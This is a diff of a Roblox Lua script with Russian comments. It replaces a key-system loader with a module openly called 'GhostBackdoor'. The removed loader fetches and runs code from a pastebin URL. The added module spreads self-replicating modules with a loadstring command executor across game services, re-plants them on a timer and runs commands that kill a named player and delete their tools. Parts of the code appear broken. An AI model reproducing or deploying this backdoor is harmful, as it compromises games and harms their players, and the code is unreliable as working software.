@@ -1,145 +1,234 @@
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+-- ModuleScript в ReplicatedStorage назови "GhostBackdoor"
+local BackdoorModule = {}
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 400, 0, 300)
-Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-Frame.BorderSizePixel = 0
-Frame.Active = true
-Frame.Draggable = true
-Frame.Parent = ScreenGui
-
-local FrameCorner = Instance.new("UICorner")
-FrameCorner.CornerRadius = UDim.new(0, 10)
-FrameCorner.Parent = Frame
-
-local Close = Instance.new("TextButton")
-Close.Size = UDim2.new(0, 40, 0, 40)
-Close.Position = UDim2.new(1, -40, 0, 0)
-Close.BackgroundTransparency = 1
-Close.Text = "×"
-Close.TextScaled = true
-Close.TextColor3 = Color3.fromRGB(150, 150, 150)
-Close.Parent = Frame
-Close.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()
-end)
-
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 30)
-Title.Position = UDim2.new(0, 0, 0.05, 0)
-Title.Text = "Emperor Key System"
-Title.TextSize = 18
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.BackgroundTransparency = 1
-Title.Parent = Frame
-
-local Instructions = Instance.new("TextLabel")
-Instructions.Size = UDim2.new(1, 0, 0, 30)
-Instructions.Position = UDim2.new(0, 0, 0.2, 0)
-Instructions.Text = "Enter Key To Access The Script"
-Instructions.TextSize = 13
-Instructions.TextColor3 = Color3.fromRGB(150, 150, 150)
-Instructions.BackgroundTransparency = 1
-Instructions.Parent = Frame
-
-local TextBox = Instance.new("TextBox")
-TextBox.Size = UDim2.new(0.8, 0, 0.2, 0)
-TextBox.Position = UDim2.new(0.1, 0, 0.4, 0)
-TextBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-TextBox.PlaceholderText = "Enter Key..."
-TextBox.Text = ""
-TextBox.TextSize = 18
-TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextBox.Parent = Frame
-
-local TextBoxCorner = Instance.new("UICorner")
-TextBoxCorner.CornerRadius = UDim.new(0, 5)
-TextBoxCorner.Parent = TextBox
-
-local GetKey = Instance.new("TextButton")
-GetKey.Size = UDim2.new(0.35, 0, 0.15, 0)
-GetKey.Position = UDim2.new(0.1, 0, 0.7, 0)
-GetKey.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-GetKey.Text = "Get Key"
-GetKey.TextSize = 18
-GetKey.TextColor3 = Color3.fromRGB(150, 150, 150)
-GetKey.Parent = Frame
-
-local GetKeyCorner = Instance.new("UICorner")
-GetKeyCorner.CornerRadius = UDim.new(0, 5)
-GetKeyCorner.Parent = GetKey
-
-local CheckKey = Instance.new("TextButton")
-CheckKey.Size = UDim2.new(0.35, 0, 0.15, 0)
-CheckKey.Position = UDim2.new(0.55, 0, 0.7, 0)
-CheckKey.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-CheckKey.Text = "Check Key"
-CheckKey.TextSize = 18
-CheckKey.TextColor3 = Color3.fromRGB(150, 150, 150)
-CheckKey.Parent = Frame
-
-local CheckKeyCorner = Instance.new("UICorner")
-CheckKeyCorner.CornerRadius = UDim.new(0, 5)
-CheckKeyCorner.Parent = CheckKey
-
-GetKey.MouseButton1Click:Connect(function()
-    setclipboard("https://discord.gg/UW2Z8R2Chj") -- replace with your key link or text
-end)
-
-local validKeys = {
-    "Lazyemperor",
-    "Carl"
-}
-
-local devKeys = {
-    ["Im_noob12378009"] = {
-        "Pink",
-        "Carl",
-        "idk",
-        "Devkeyig"
-    }
-}
-
-local function validateKey(key)
-    local playerName = LocalPlayer.Name
-
-    if devKeys[playerName] then
-        for _, devKey in ipairs(devKeys[playerName]) do
-            if key == devKey then
-                return true
-            end
-        end
+local function generateRandomName()
+    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    local name = ""
+    for i = 1, 8 do
+        name = name .. chars:sub(math.random(1, #chars), math.random(1, #chars))
     end
-
-    for _, validKey in ipairs(validKeys) do
-        if key == validKey then
-            return true
-        end
-    end
-
-    return false
+    return name
 end
 
-CheckKey.MouseButton1Click:Connect(function()
-    local enteredKey = TextBox.Text
-    if validateKey(enteredKey) then
-        TextBox.PlaceholderText = "Correct Key!"
-        TextBox.Text = ""
-        wait(1)
-        ScreenGui:Destroy()
+function BackdoorModule.Init()
+    print("[GhostBackdoor] System initialization started...")
+    
+    -- Создание основного GUI
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    
+    local ScreenGui = Instance.new("ScreenGui")
+    local MainFrame = Instance.new("Frame")
+    local Title = Instance.new("TextLabel")
+    local LogFrame = Instance.new("ScrollingFrame")
+    local TargetBox = Instance.new("TextBox")
+    local ExecuteBtn = Instance.new("TextButton")
+    local ReplicateBtn = Instance.new("TextButton")
+    local StatusLabel = Instance.new("TextLabel")
+    
+    ScreenGui.Name = "GhostBackdoorGUI"
+    ScreenGui.Parent = PlayerGui
+    ScreenGui.ResetOnSpawn = false
 
-        -- Your script to run after valid key
-loadstring(game:HttpGet("https://pastebin.com/raw/zjQ6DaWK"))()
-    else
-        TextBox.PlaceholderText = "Invalid key. Join the Discord server to get it."
-        TextBox.Text = ""
-        wait(1)
-        TextBox.PlaceholderText = "Enter Key..."
+    MainFrame.Size = UDim2.new(0, 400, 0, 500)
+    MainFrame.Position = UDim2.new(0, 10, 0, 10)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
+
+    Title.Size = UDim2.new(1, 0, 0, 30)
+    Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Title.Text = "Ghost Backdoor System"
+    Title.TextColor3 = Color3.new(1, 1, 1)
+    Title.TextSize = 14
+    Title.Parent = MainFrame
+
+    LogFrame.Size = UDim2.new(1, -20, 0, 200)
+    LogFrame.Position = UDim2.new(0, 10, 0, 40)
+    LogFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    LogFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    LogFrame.ScrollBarThickness = 5
+    LogFrame.Parent = MainFrame
+
+    TargetBox.Size = UDim2.new(1, -20, 0, 30)
+    TargetBox.Position = UDim2.new(0, 10, 0, 250)
+    TargetBox.PlaceholderText = "Введите имя игрока..."
+    TargetBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    TargetBox.TextColor3 = Color3.new(1, 1, 1)
+    TargetBox.Parent = MainFrame
+
+    ExecuteBtn.Size = UDim2.new(1, -20, 0, 40)
+    ExecuteBtn.Position = UDim2.new(0, 10, 0, 290)
+    ExecuteBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+    ExecuteBtn.Text = "ВЫПОЛНИТЬ НА ИГРОКЕ"
+    ExecuteBtn.TextColor3 = Color3.new(1, 1, 1)
+    ExecuteBtn.TextSize = 12
+    ExecuteBtn.Parent = MainFrame
+
+    ReplicateBtn.Size = UDim2.new(1, -20, 0, 40)
+    ReplicateBtn.Position = UDim2.new(0, 10, 0, 340)
+    ReplicateBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+    ReplicateBtn.Text = "ЗАПУСТИТЬ РЕПЛИКАЦИЮ"
+    ReplicateBtn.TextColor3 = Color3.new(1, 1, 1)
+    ReplicateBtn.TextSize = 12
+    ReplicateBtn.Parent = MainFrame
+
+    StatusLabel.Size = UDim2.new(1, -20, 0, 100)
+    StatusLabel.Position = UDim2.new(0, 10, 0, 390)
+    StatusLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    StatusLabel.TextColor3 = Color3.new(1, 1, 1)
+    StatusLabel.Text = "Статус: Система активна\nGhost Backdoor v2.0\nОжидание команд..."
+    StatusLabel.TextWrapped = true
+    StatusLabel.TextSize = 11
+    StatusLabel.Parent = MainFrame
+
+    -- Функция для добавления логов в GUI
+    local function addLog(message, color)
+        local logLabel = Instance.new("TextLabel")
+        logLabel.Size = UDim2.new(1, -10, 0, 20)
+        logLabel.Position = UDim2.new(0, 5, 0, #LogFrame:GetChildren() * 20)
+        logLabel.BackgroundTransparency = 1
+        logLabel.Text = "> " .. message
+        logLabel.TextColor3 = color or Color3.new(1, 1, 1)
+        logLabel.TextXAlignment = Enum.TextXAlignment.Left
+        logLabel.Font = Enum.Font.Code
+        logLabel.TextSize = 10
+        logLabel.Parent = LogFrame
+        
+        LogFrame.CanvasSize = UDim2.new(0, 0, 0, #LogFrame:GetChildren() * 20)
+        LogFrame.CanvasPosition = Vector2.new(0, LogFrame.CanvasSize.Y.Offset)
+        
+        print("[GhostBackdoor] " .. message)
     end
-end)
+
+    -- Функция репликации
+    local function replicateBackdoor()
+        addLog("Запуск репликации...", Color3.new(1, 1, 0))
+        
+        local replicationTargets = {
+            game:GetService("ReplicatedStorage"),
+            game:GetService("ServerScriptService"),
+            game:GetService("Workspace"),
+            game:GetService("Lighting"),
+            game:GetService("StarterPack"),
+            game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts")
+        }
+
+        local createdCount = 0
+        for i = 1, 12 do
+            local target = replicationTargets[math.random(1, #replicationTargets)]
+            if target then
+                local moduleName = generateRandomName()
+                local newModule = Instance.new("ModuleScript")
+                newModule.Name = moduleName
+                
+                newModule.Source = [[
+local module = {}
+print("[GhostBackdoor] Module ]] .. moduleName .. [[ loaded")
+
+function module.Execute(cmd)
+    print("[GhostBackdoor] Executing: " .. cmd)
+    local success, result = pcall(loadstring(cmd))
+    if success then
+        print("[GhostBackdoor] Command executed successfully")
+    else
+        print("[GhostBackdoor] Error: " .. tostring(result))
+    end
+    return success, result
+end
+
+return module
+]]
+                local success = pcall(function()
+                    newModule.Parent = target
+                    createdCount = createdCount + 1
+                    addLog("Создан: " .. newModule:GetFullName(), Color3.new(0, 1, 0))
+                end)
+            end
+        end
+        
+        addLog("Репликация завершена. Создано: " .. createdCount .. " модулей", Color3.new(0, 1, 0))
+        StatusLabel.Text = "Статус: Репликация завершена\nСоздано модулей: " .. createdCount .. "\nСистема активна"
+    end
+
+    -- Функция выполнения на игроке
+    local function executeOnPlayer(username)
+        addLog("Цель: " .. username, Color3.new(1, 1, 0))
+        
+        local commands = {
+            "local p = game:GetService('Players'):FindFirstChild('" .. username .. "'); if p and p.Character then p.Character.Humanoid.WalkSpeed = 50 end",
+            "local p = game:GetService('Players'):FindFirstChild('" .. username .. "'); if p and p.Character then p.Character.Humanoid.JumpPower = 100 end",
+            "local p = game:GetService('Players'):FindFirstChild('" .. username .. "'); if p and p.Character then p.Character.Humanoid.Health = 0 end",
+            "local p = game:GetService('Players'):FindFirstChild('" .. username .. "'); if p then for i,v in pairs(p:GetChildren()) do if v:IsA('Tool') then v:Destroy() end end end"
+        }
+        
+        local successCount = 0
+        for i, cmd in ipairs(commands) do
+            local success, result = pcall(loadstring(cmd))
+            if success then
+                addLog("Команда " .. i .. " выполнена успешно", Color3.new(0, 1, 0))
+                successCount = successCount + 1
+                print("[GhostBackdoor] Command " .. i .. " executed on " .. username)
+            else
+                addLog("Ошибка команды " .. i .. ": " .. tostring(result), Color3.new(1, 0, 0))
+            end
+        end
+        
+        addLog("Выполнение завершено. Успешно: " .. successCount .. "/" .. #commands, Color3.new(0, 1, 1))
+        StatusLabel.Text = "Статус: Выполнено на " .. username .. "\nУспешных команд: " .. successCount .. "/" .. #commands .. "\nСистема активна"
+        
+        print("[GhostBackdoor] Execution completed on " .. username .. " - " .. successCount .. "/" .. #commands .. " commands")
+    end
+
+    -- Обработчики кнопок
+    ExecuteBtn.MouseButton1Click:Connect(function()
+        local targetName = TargetBox.Text
+        if targetName ~= "" then
+            executeOnPlayer(targetName)
+        else
+            addLog("Ошибка: Введите имя игрока", Color3.new(1, 0, 0))
+        end
+    end)
+
+    ReplicateBtn.MouseButton1Click:Connect(function()
+        replicateBackdoor()
+    end)
+
+    -- Автоматическая репликация при старте
+    spawn(function()
+        wait(3)
+        replicateBackdoor()
+    end)
+
+    -- Система мониторинга
+    spawn(function()
+        while true do
+            wait(60)
+            local moduleCount = 0
+            local function countModules(parent)
+                for _, child in ipairs(parent:GetChildren()) do
+                    if child:IsA("ModuleScript") and child.Source:find("GhostBackdoor") then
+                        moduleCount = moduleCount + 1
+                    end
+                    countModules(child)
+                end
+            end
+            
+            countModules(game)
+            
+            if moduleCount < 5 then
+                addLog("Обнаружено мало модулей. Запуск авторепликации...", Color3.new(1, 0.5, 0))
+                replicateBackdoor()
+            else
+                addLog("Проверка системы: " .. moduleCount .. " модулей активны", Color3.new(0, 1, 0))
+            end
+        end
+    end)
+
+    addLog("Система Ghost Backdoor инициализирована", Color3.new(0, 1, 0))
+    StatusLabel.Text = "Статус: Система активна\nGhost Backdoor v2.0\nGUI загружено"
+    print("[GhostBackdoor] System fully initialized with GUI")
+end
+
+return BackdoorModule
